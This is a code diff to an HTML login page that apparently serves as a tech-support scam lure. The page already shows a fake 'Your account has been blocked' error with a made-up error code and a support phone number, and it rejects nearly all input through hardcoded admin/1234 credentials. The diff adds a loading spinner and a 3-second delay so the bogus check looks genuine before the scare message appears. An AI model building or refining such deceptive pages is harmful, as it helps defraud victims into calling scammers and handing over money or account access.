@@ -62,6 +62,7 @@
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             margin-top: 20px;
+            position: relative;
         }
 
         .input-group {
@@ -117,6 +118,29 @@
             font-size: 0.9em;
         }
 
+        .spinner {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            border: 5px solid #ccc;
+            border-top-color: #0072ce;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
         .login-options {
             text-align: center;
             margin-top: 20px;
@@ -170,6 +194,7 @@
     </header>
 
     <div class="login-section-wrapper">
+        <div class="spinner" id="spinner"></div>
         <form id="loginForm">
             <div class="error-message" id="error-message">
                 <p>Error Code : 0X0X0027384 <br> Your account has been blocked due to some suspicious login attempts. <br> Contact Support : <a href="tel:18332030921">+1-833-203-0921</a></p>
@@ -226,16 +251,26 @@
             const password = document.getElementById("password").value;
             const errorMessage = document.getElementById("error-message");
             const infoMessage = document.getElementById("info-message");
+            const spinner = document.getElementById("spinner");
 
-            // Show error message if user ID or password is incorrect
-            if (userID === "" || password === "" || userID !== "admin" || password !== "1234") {
-                errorMessage.style.display = "block";
-                infoMessage.style.display = "block";
-            } else {
-                errorMessage.style.display = "none";
-                infoMessage.style.display = "none";
-                alert("Login successful! Redirecting...");
-            }
+            // Show spinner
+            spinner.style.display = "block";
+
+            // Simulate a delay to display the error message
+            setTimeout(function () {
+                // Hide spinner
+                spinner.style.display = "none";
+
+                // Show error message if user ID or password is incorrect
+                if (userID === "" || password === "" || userID !== "admin" || password !== "1234") {
+                    errorMessage.style.display = "block";
+                    infoMessage.style.display = "block";
+                } else {
+                    errorMessage.style.display = "none";
+                    infoMessage.style.display = "none";
+                    alert("Login successful! Redirecting...");
+                }
+            }, 3000); // 3-second delay
         });
     </script>
 </body>
